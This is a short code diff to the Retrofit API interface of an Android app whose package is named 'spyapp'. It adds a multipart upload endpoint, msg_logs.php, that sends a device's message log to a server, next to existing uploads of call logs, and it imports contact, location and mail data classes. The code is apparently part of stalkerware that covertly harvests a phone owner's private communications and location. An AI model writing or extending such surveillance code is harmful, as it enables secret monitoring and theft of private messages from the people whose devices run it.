@@ -5,6 +5,7 @@ import kkactive_india.in.spyapp.callLogPOJO.callsBean;
 import kkactive_india.in.spyapp.contactPOJO.contactBean;
 import kkactive_india.in.spyapp.locationPOJO.locationBean;
 import kkactive_india.in.spyapp.mailPOJO.mailBean;
+import kkactive_india.in.spyapp.msgPOJO.MsgBean;
 import retrofit2.Call;
 import retrofit2.http.Body;
 import retrofit2.http.Headers;
@@ -59,6 +60,13 @@ public interface Allapi {
     Call<callsBean> calls (
             @Part("email") String m,
             @Part("call_log") String n
+    );
+
+    @Multipart
+    @POST("msg_logs.php")
+    Call<MsgBean> msgs (
+            @Part("email") String m,
+            @Part("msg_log") String n
     );
 
 }
